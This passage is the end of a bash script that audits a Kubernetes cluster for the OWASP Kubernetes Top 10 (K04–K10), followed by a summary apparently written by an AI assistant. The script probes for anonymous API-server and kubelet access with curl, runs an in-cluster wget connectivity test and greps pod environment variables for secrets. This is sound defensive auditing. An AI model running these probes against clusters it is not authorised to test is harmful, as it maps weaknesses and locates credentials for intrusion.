WILDCARD_ROLES=$(kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]? == "*") or (.resources[]? == "*")) | .metadata.name' | wc -l)
if [ $WILDCARD_ROLES -gt 5 ]; then
    log_finding "HIGH" "$WILDCARD_ROLES roles with wildcard permissions"
fi

# K04: Lack of Centralized Policy Enforcement
echo -e "\n${BLUE}=== K04: Lack of Centralized Policy Enforcement ===${NC}"
ADMISSION_WEBHOOKS=$(kubectl get validatingadmissionwebhooks --no-headers 2>/dev/null | wc -l)
if [ $ADMISSION_WEBHOOKS -eq 0 ]; then
    log_finding "HIGH" "No validating admission controllers found"
fi

POD_SECURITY_NAMESPACES=$(kubectl get namespaces -o json | jq -r '.items[] | select(.metadata.labels."pod-security.kubernetes.io/enforce") | .metadata.name' | wc -l)
TOTAL_NAMESPACES=$(kubectl get namespaces --no-headers | wc -l)
if [ $POD_SECURITY_NAMESPACES -lt $((TOTAL_NAMESPACES / 2)) ]; then
    log_finding "MEDIUM" "Pod Security Standards not enforced in most namespaces"
fi

# K05: Inadequate Logging and Monitoring
echo -e "\n${BLUE}=== K05: Inadequate Logging and Monitoring ===${NC}"
LOGGING_PODS=$(kubectl get pods -A | grep -c -E "fluentd|elasticsearch|kibana|prometheus|grafana")
if [ $LOGGING_PODS -eq 0 ]; then
    log_finding "MEDIUM" "No centralized logging or monitoring detected"
fi

FALCO_PODS=$(kubectl get pods -A | grep -c falco)
if [ $FALCO_PODS -eq 0 ]; then
    log_finding "MEDIUM" "No runtime security monitoring (Falco) detected"
fi

# K06: Broken Authentication Mechanisms
echo -e "\n${BLUE}=== K06: Broken Authentication Mechanisms ===${NC}"
# Test anonymous access
if curl -k -s --connect-timeout 5 https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces >/dev/null 2>&1; then
    log_finding "CRITICAL" "Anonymous access to API server possible"
fi

AUTO_MOUNT_SA_PODS=$(kubectl get pods -A -o json | jq '[.items[] | select(.spec.automountServiceAccountToken != false)] | length')
if [ $AUTO_MOUNT_SA_PODS -gt 10 ]; then
    log_finding "MEDIUM" "$AUTO_MOUNT_SA_PODS pods auto-mounting service account tokens"
fi

# K07: Missing Network Segmentation Controls
echo -e "\n${BLUE}=== K07: Missing Network Segmentation Controls ===${NC}"
NETWORK_POLICIES=$(kubectl get networkpolicies -A --no-headers 2>/dev/null | wc -l)
if [ $NETWORK_POLICIES -eq 0 ]; then
    log_finding "HIGH" "No network policies found in cluster"
fi

# Test basic connectivity
kubectl run nettest --image=busybox --rm --restart=Never --timeout=10s -- wget -qO- --timeout=3 http://kubernetes.default.svc.cluster.local &>/dev/null
if [ $? -eq 0 ]; then
    log_finding "MEDIUM" "Cross-namespace communication allowed"
fi

# K08: Secrets Management Failures
echo -e "\n${BLUE}=== K08: Secrets Management Failures ===${NC}"
TOTAL_SECRETS=$(kubectl get secrets -A --no-headers 2>/dev/null | wc -l)
EXTERNAL_SECRET_TOOLS=$(kubectl get pods -A | grep -c -E "vault|external-secrets|sealed-secrets")

if [ $TOTAL_SECRETS -gt 20 ] && [ $EXTERNAL_SECRET_TOOLS -eq 0 ]; then
    log_finding "MEDIUM" "$TOTAL_SECRETS secrets without external management"
fi

# Check for hardcoded secrets in env vars
HARDCODED_SECRETS=$(kubectl get pods -A -o json | jq -r '.items[] | .spec.containers[] | .env[]? | select(.value | test("password|token|key|secret"; "i")) | .name' 2>/dev/null | wc -l)
if [ $HARDCODED_SECRETS -gt 0 ]; then
    log_finding "HIGH" "Hardcoded secrets found in environment variables"
fi

# K09: Misconfigured Cluster Components
echo -e "\n${BLUE}=== K09: Misconfigured Cluster Components ===${NC}"
# Check kubelet access
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}' 2>/dev/null)
if [ ! -z "$NODE_IP" ]; then
    if curl -k -s --connect-timeout 5 https://$NODE_IP:10250/pods >/dev/null 2>&1; then
        log_finding "CRITICAL" "Anonymous access to kubelet possible"
    fi
fi

DEPRECATED_APIS=$(kubectl api-versions | grep -c -E "v1alpha1|v1beta1")
if [ $DEPRECATED_APIS -gt 0 ]; then
    log_finding "MEDIUM" "$DEPRECATED_APIS deprecated API versions available"
fi

# K10: Outdated and Vulnerable Kubernetes Components
echo -e "\n${BLUE}=== K10: Outdated and Vulnerable Kubernetes Components ===${NC}"
SERVER_VERSION=$(kubectl version --short --server 2>/dev/null | awk '{print $3}' | tr -d 'v')
if [[ "$SERVER_VERSION" < "1.25.0" ]] && [ ! -z "$SERVER_VERSION" ]; then
    log_finding "HIGH" "Kubernetes version $SERVER_VERSION may be outdated"
fi

# Check cluster age
CLUSTER_AGE_SECONDS=$(kubectl get nodes -o json | jq -r '.items[0].metadata.creationTimestamp' | xargs -I {} date -d {} +%s 2>/dev/null)
CURRENT_TIME=$(date +%s)
if [ ! -z "$CLUSTER_AGE_SECONDS" ]; then
    AGE_DAYS=$(( (CURRENT_TIME - CLUSTER_AGE_SECONDS) / 86400 ))
    if [ $AGE_DAYS -gt 180 ]; then
        log_finding "MEDIUM" "Cluster is $AGE_DAYS days old, check for updates"
    fi
fi

# Final Summary
echo -e "\n${BLUE}=========================================="
echo "SECURITY ASSESSMENT SUMMARY"
echo "==========================================${NC}"
echo -e "Critical findings: ${RED}$CRITICAL_COUNT${NC}"
echo -e "High findings: ${YELLOW}$HIGH_COUNT${NC}"  
echo -e "Medium findings: ${BLUE}$MEDIUM_COUNT${NC}"

TOTAL_FINDINGS=$((CRITICAL_COUNT + HIGH_COUNT + MEDIUM_COUNT))
echo -e "Total findings: $TOTAL_FINDINGS"

if [ $CRITICAL_COUNT -gt 0 ]; then
    echo -e "\n${RED}IMMEDIATE ACTION REQUIRED: Critical vulnerabilities found!${NC}"
elif [ $HIGH_COUNT -gt 0 ]; then
    echo -e "\n${YELLOW}HIGH PRIORITY: Significant security issues detected${NC}"
elif [ $MEDIUM_COUNT -gt 0 ]; then
    echo -e "\n${BLUE}MEDIUM PRIORITY: Security improvements recommended${NC}"
else
    echo -e "\n${GREEN}GOOD: No major security issues detected${NC}"
fi

echo -e "\nScan completed at $(date)"
echo "========================================"
```

This comprehensive guide provides:

1. **Detailed testing methodologies** for each OWASP Kubernetes Top 10 vulnerability
2. **Specific commands** to identify each vulnerability type
3. **Clear indicators** of what constitutes a security issue
4. **Exploitation examples** showing how vulnerabilities can be abused
5. **Automated scanning scripts** for each vulnerability category
6. **Complete scanner** that tests all K01-K10 vulnerabilities at once

Each section includes practical commands you can run immediately to test your Azure Kubernetes Service cluster for security vulnerabilities, making this a comprehensive penetration testing cheatsheet for Kubernetes environments.